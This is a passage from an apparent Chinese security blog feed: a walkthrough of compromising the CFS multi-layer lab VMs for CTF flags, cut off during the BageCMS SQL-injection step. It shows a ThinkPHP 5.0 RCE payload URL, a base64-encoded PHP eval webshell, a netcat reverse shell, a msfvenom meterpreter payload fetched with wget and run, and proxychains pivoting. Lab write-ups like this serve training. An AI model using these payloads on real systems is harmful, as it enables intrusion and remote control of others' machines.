<code>Flag</code>！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CFS靶机实战演练-从外网杀进三层内网，横向渗透拿到Flag</title>
      <link href="/2020/02/18/Red-Teaming-CFS/"/>
      <url>/2020/02/18/Red-Teaming-CFS/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29415950&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个靶机是 <code>TeamsSix</code>前辈 出的一个靶场，偏向于<code>CTF</code>，但是我认为它更适合真实环境！<code>CFS</code>靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每一层的<code>Flag</code>进行拿分！如果想要获取这个靶场的话，大家可以在我的公众号”<code>saulGoodman</code>“回复”<code>CFS</code>“获取<code>OVA</code>文件下载地址！</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>打开靶机的时候需要对它 <code>IP</code> 进行简单的更改！我在 <code>VMware</code> 设置了虚拟网络，其中<code>桥接</code>（VMnet0）我设置成和我PC是同一块网卡！（具体选择那块网卡就在<code>网络适配器选项</code>那里选择自己用的网卡）因为你不选择网卡的话 <code>VMware</code> 会自动选择一块网卡，很有可能导致桥接无法上网！</p><p>然后我又设置了 <code>VMnet1</code>（仅主机模式）、<code>VMnet2</code>（仅主机模式），这两个个网络是<code>不出外网</code>的，也就是当做我们的<code>内网主机</code>！其中它们的子网地址分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VMnet1: 子网IP：192.168.22.0 子网掩码：255.255.255.0</span><br><span class="line">VMnet2：子网IP：192.168.33.0子网掩码：255.255.255.0</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1087.png" alt="图片"></p><p>设置好虚拟网络之后我们打开靶机还需要设置一下他们的<code>IP</code>！这里我要编辑一下 <code>Target1</code> 的 <code>IP</code> 和<code>子网掩码</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig ens37 192.168.22.11 netmask 255.255.255.0</span><br><span class="line">注释：ens37 是我们的仅主机模式（VMnet1）的网卡</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1088.png" alt="图片"></p><p>设置完 <code>Target1</code> 我们还需要设置 <code>Target2</code> 的网络：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig ens33 192.168.22.22 netmask 255.255.255.0</span><br><span class="line">ipconfig ens38 192.168.33.22 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1089.png" alt="图片"></p><p>而 <code>Targert3</code> 就不需要设置了，它已经被设置为 <code>192.168.33.33</code> 这个<code>静态IP</code>了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1090.png" alt="图片"></p><p>设置完之后我们就可以对这个靶机开始渗透了！</p><h2 id="攻击拓扑图"><a href="#攻击拓扑图" class="headerlink" title="攻击拓扑图"></a>攻击拓扑图</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1091.png" alt="图片"></p><h2 id="外部打点"><a href="#外部打点" class="headerlink" title="外部打点"></a>外部打点</h2><p>先对 <code>Targer1</code> 进行信息搜集端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T5 192.168.1.103 --script=vuln</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~# nmap -A -T5 192.168.1.103 --script=vuln</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-18 00:14 EST</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Stats: 0:09:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 98.77% done; ETC: 00:24 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 192.168.1.103</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:7.4: </span><br><span class="line">|     CVE-2018-159195.0https://vulners.com/cve/CVE-2018-15919</span><br><span class="line">|_    CVE-2017-159065.0https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-vuln-cve2011-3192: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Apache byterange filter DoS</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2011-3192  BID:49303</span><br><span class="line">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="line">|       overlapping byte ranges are requested.</span><br><span class="line">|     Disclosure date: 2011-08-19</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="line">|       https://www.tenable.com/plugins/nessus/55976</span><br><span class="line">|       https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="line">|_      https://www.securityfocus.com/bid/49303</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|_  100000  3,4          111/udp6  rpcbind</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /robots.txt: Robots file</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">MAC Address: 00:0C:29:5A:1C:5E (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.16 ms 192.168.1.103</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 566.01 seconds</span><br></pre></td></tr></table></figure><p>扫描出来之后发现它开放了 <code>21</code>（ftp）、<code>22</code>（ssh）、<code>80</code>（http）、<code>111</code>（RPC）、<code>888</code>（http）、<code>3306</code>（Mysql）、<code>8888</code>（http）这些端口服务！</p><p>其中扫出来了好多漏洞，例如：</p><p> <code>CVE-2011-1002</code>（Avahi Dos攻击）Avahi是Linux下常用的类DNS服务。它可以帮助主机在没有DNS服务的局域网中，发现基于Zeroconf协议的设备和服务。该工具工作于UDP 5353端口。在0.6.29版本之前，该服务存在CVE-2011-1002漏洞。Nmap的broadcast-avahi-dos脚本会寻找本地网络的DNS服务器，并发送空的UDP包。如果存在该漏洞，就可以导致服务器奔溃。</p><p> <code>CVE-2018-15919</code>（OpenSSH信息泄露漏洞）其中CVE-2018-15919影响自2011年9月6日发布的5.9版本到今年8月24日发布的最新版本7.8。CVE-2018-15473则影响自1999年以来至今年7.7版本中所有版本，远程攻击者可利用漏洞猜测在OpenSSH服务器上注册的用户名。</p><p> <code>CVE-2017-15906</code>，7.6之前的OpenSSH中sftp-server.c中的process_open函数不能正确阻止只读模式下的写操作，这使攻击者可以创建零长度文件。</p><p> <code>CVE-2011-3192</code>（Apache HTTP Server CVE-2011-3192拒绝服务漏洞）Apache HTTP Server是一款开源的流行的HTTPD服务程序。当处理包含大量Ranges头的HTTP请求时，ByteRange过滤器存在一个错误，攻击者可以向服务器发送特制HTTP请求，消耗大量内存，造成应用程序崩溃。</p><p> <code>CVE-2007-6750</code>，Apache HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，如Slowloris所示，这与2.2.15之前版本中缺少mod_ReqTimeout模块有关。</p><p> 这些扫描出来的漏洞没什么可利用的价值，我们还是先看看它的 <code>web</code> 吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1092.png" alt="图片"></p><h2 id="ThinkPHP-V5-0-RCE-Getshell"><a href="#ThinkPHP-V5-0-RCE-Getshell" class="headerlink" title="ThinkPHP-V5.0-RCE-Getshell"></a>ThinkPHP-V5.0-RCE-Getshell</h2><p>打开后发现它是 <code>ThinkPHP</code> 框架，版本是 <code>V5.0</code>，这个时候我想起了它存在一个 <code>RCE</code>（远程命令执行），于是我利用网上的 <code>POC</code> 对它进行试探发现存在命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1093.png" alt="图片"></p><p>紧接着我写入一句话到 <code>cmd.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1094.png" alt="图片"></p><p>写入成功是成功了，但是我们的 <code>$_POST</code> 被过滤掉了，估计有防护机制：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1095.png" alt="图片"></p><p>对于这种过滤，我们可以使用一些编码来绕过，例如 <code>URL编码</code>、<code>BASE64编码</code>…等等，我使用的是<code>Base64</code>编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">编码前：&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line">编码后：PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=</span><br><span class="line">POC: echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=&quot; | base64 -d &gt; cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1096.png" alt="图片"></p><p>随后重新写入一句话到 <code>cmd.php</code> 获取到 <code>webshell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;|base64 -d &gt; cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1097.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1098.png" alt="图片"></p><p>这里还有另一种方法！既然它可以执行命令那么我们直接让他反弹<code>shell</code>到我们的<code>nc</code>就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KALI：nc -lnvp 6666</span><br><span class="line">目标：nc 192.168.1.104 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1099.png" alt="图片"></p><p>这个时候成功获取 <code>shell</code>！随后我用<code>python</code>获取一枚 <code>bash</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1100.png" alt="图片"></p><h2 id="杀入第一层内网Target1"><a href="#杀入第一层内网Target1" class="headerlink" title="杀入第一层内网Target1"></a>杀入第一层内网Target1</h2><p>获取到 <code>shell</code> 后在网站的 <code>/www/wwwroot/ThinkPHP/public</code> 目录下获取到了一个 <code>Flag</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1101.png" alt="图片"></p><p>接着查看 <code>robots.txt</code> 文件得到第二个 <code>Flag</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1102.png" alt="图片"></p><p>随后在系统根目录下拿到了第三个 <code>Flag</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1103.png" alt="图片"></p><h2 id="杀入第二层内网Target2"><a href="#杀入第二层内网Target2" class="headerlink" title="杀入第二层内网Target2"></a>杀入第二层内网Target2</h2><p>首先我是先查看了系统内核，发现他是<code>2019</code>年，<code>x86</code>位的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1104.jpg" alt="图片"></p><p>那么我还是先用 <code>MSF</code> 生成一个可执行文件来反弹一枚<code>shell</code>吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 -f elf &gt; 4444.elf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1105.jpg" alt="图片"></p><p>生成完后我们需要把木马上传到目标主机，我是用 <code>python</code> 打开了 <code>Web</code> 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8090</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1106.jpg" alt="图片"></p><p>然后在目标主机中使用 <code>wget</code> 下载我们的木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.104:8090/4444.elf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1107.jpg" alt="图片"></p><p>最后给 <code>4444.elf</code> 一个<code>可执行</code>权限并运行成功上线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 4444.elf</span><br><span class="line">./4444.elf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1108.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1109.jpg" alt="图片"></p><p>上线之后我查看 <code>ifconfig</code> 发现他有<code>五</code>个网卡：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ifconfig </span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">============</span><br><span class="line">Name         : ens33</span><br><span class="line">Hardware MAC : 00:0c:29:5a:1c:5e</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.1.103</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::1be:3f23:9cb6:8513</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">============</span><br><span class="line">Name         : ens37</span><br><span class="line">Hardware MAC : 00:0c:29:5a:1c:68</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.22.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv4 Address : 192.168.22.11</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::28fe:91ab:c417:d360</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  4</span><br><span class="line">============</span><br><span class="line">Name         : virbr0</span><br><span class="line">Hardware MAC : 52:54:00:5a:99:42</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  5</span><br><span class="line">============</span><br><span class="line">Name         : virbr0-nic</span><br><span class="line">Hardware MAC : 52:54:00:5a:99:42</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : BROADCAST,MULTICAST</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>其中可用的网卡就是这两个：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1110.jpg" alt="图片"></p><p>紧接着我使用 <code>MSF</code> 中的这个命令获取当前的网段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1111.jpg" alt="图片"></p><p>发现它有两个网段：一个是 <code>192.168.1.10/24</code>，另一个是 <code>192.168.22.0/24</code>！随后我只给后者添加一个路由表（因为前者的内网主机有我内网的主机，就不添加了！）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1112.jpg" alt="图片"></p><p>添加成功后我需要对它的内网进行扫描，看看内网中有多少存活的主机！我用到的扫描模块是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1113.jpg" alt="图片"></p><p>扫描出来发现 <code>192.168.22.22</code> 这台主机存活，肯定有人会说 <code>192.168.22.11</code> 这台主机不是也存活吗？实际上<code>192.168.22.11</code>这台主机就是我们的<code>WEB</code>服务器！所以说我们就怼<code>192.168.22.22</code>这台主机！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1114.jpg" alt="图片"></p><p>紧接着后渗透我使用了 <code>socks4</code> 代理，用到的模块是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/socks4a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1115.jpg" alt="图片"></p><p>然后我们还需要设置一下 <code>proxychain</code> 代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1116.jpg" alt="图片"></p><p>设置完后我们就可以对它内网进行扫描了！首先是对它进行端口扫描看看它开放了那些端口服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.22.22</span><br><span class="line">注释：（因为socks4不支持ICMP协议，所以我们就不用对它使用ping，所以就使用-Pn 参数，而-sT是使用TCP扫描）</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1117.jpg" alt="图片"></p><p>由上图可知，它开放了 <code>21</code>(ftp)、<code>22</code>（ssh）、<code>80</code>（http）、<code>3306</code>（mysql）、<code>8888</code>（sun-answerbook）这些端口服务！先从 <code>80</code> 的 <code>web</code> 服务开始查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.22/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1118.jpg" alt="图片"></p><h2 id="BageCMS-SQL注入"><a href="#BageCMS-SQL注入" class="headerlink" title="BageCMS-SQL注入"></a>BageCMS-SQL注入</h2><p>打开后发现网站 <code>CMS</code> 是 <code>BageCMS</code>，我还是先对它进行目录扫描吧，看看有什么目录文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains dirb http://192.168.22.22</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1119.jpg" alt="图片"></p><p>扫描得到了一个 <code>robots.txt</code> 文件，打开后发现了他的目录文件、后台地址和 <code>CMS</code> 信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.22/robots.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1120.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1121.png" alt="图片"></p><p>尝试了弱口令后没有成功！紧接着我查看了它的主页源码发现了一个提示信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 